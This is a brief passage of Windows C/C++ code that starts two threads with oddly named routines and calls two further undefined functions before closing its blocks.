		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)qweqweqweqweqwe, NULL, NULL, NULL);
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)rndforambt, NULL, NULL, NULL);

		LARNDRLPP();
		LASTPRNDR();
	}
}
